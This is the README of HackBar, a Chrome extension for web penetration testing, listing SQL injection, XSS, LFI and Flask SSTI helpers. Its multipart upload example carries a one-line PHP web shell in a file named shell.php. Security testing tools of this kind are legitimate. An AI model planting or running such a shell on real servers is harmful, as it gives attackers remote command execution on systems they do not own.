# HackBar

HackBar for Chrome.

Available on [Chrome Web Store](https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc).

## Requested Permissions

* tabs
* webRequest
* webRequestBlocking

## Features

* Supported methods
  * GET
  * POST
    * application/x-www-form-urlencoded
    * [multipart/form-data](#multipartform-data)
    * [application/json](#applicationjson)

* SQLi
  * Dump all database names (MySQL, PostgreSQL)
  * Dump tables from database (MySQL, PostgreSQL)
  * Dump columns from database (MySQL, PostgreSQL)
  * Union select statement (MySQL, PostgreSQL)
  * Error-based injection statement (MySQL, PostgreSQL)
  * Space to Inline comment

* XSS
  * Html encode/decode
  * String.fromCharCode encode/decode

* LFI
  * PHP wrapper - Base64

* SSTI
  * Flask RCE ([Reference](https://twitter.com/realgam3/status/1184747565415358469))

* Encoding
  * URL encode/decode
  * Base64 encode/decode
  * Hexadecimal encode/decode
  * Unicode encode/decode

* Hashing
  * MD5
  * SHA1
  * SHA256
  * SHA512

## Usage

### How to open it?

1. Open **Developer tools** (Press ```F12``` or ```Ctrl + Shift + I```)
2. Switch to **HackBar** tab
3. Enjoy it

### Shortcuts

| Description | Default   | Mac           |
| ----------- | --------- | ------------- |
| Load URL    | `Alt + A` | `Control + A` |
| Split URL   | `Alt + S` | `Control + S` |
| Execute URL | `Alt + X` | `Control + X` |

### Supported enctype

#### multipart/form-data

After changing **enctype** field to ```multipart/form-data```, you can put your payload into **Body** field such as the following:

```
------WebKitFormBoundarydbJBATDXCC6CL0lZ
Content-Disposition: form-data; name="user"

user
------WebKitFormBoundarydbJBATDXCC6CL0lZ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-httpd-php

<?php passthru($_GET['c']); ?>
------WebKitFormBoundarydbJBATDXCC6CL0lZ--
```

We will consider the first line as boundary, and reconstruct a form element to send your request.

Therefore, sent boundary will not be the same as your typed.

#### application/json

After changing **enctype** field to ```application/json```, you can put your payload into **Body** field such as the following:

```
{
  "username": "admin",
  "password": "admin"
}
```

In order to post JSON data, we will insert a dummy field or object to your JSON such as the following:

```
{"username":"admin","password":"admin","4dxnzjzd5mi":"="}
```

For more details, please visit "[Posting JSON with an HTML Form](https://systemoverlord.com/2016/08/24/posting-json-with-an-html-form.html)".

## Third-party Libraries

* Vue.js
* Vuetify.js
* [crypto-js](https://github.com/brix/crypto-js)
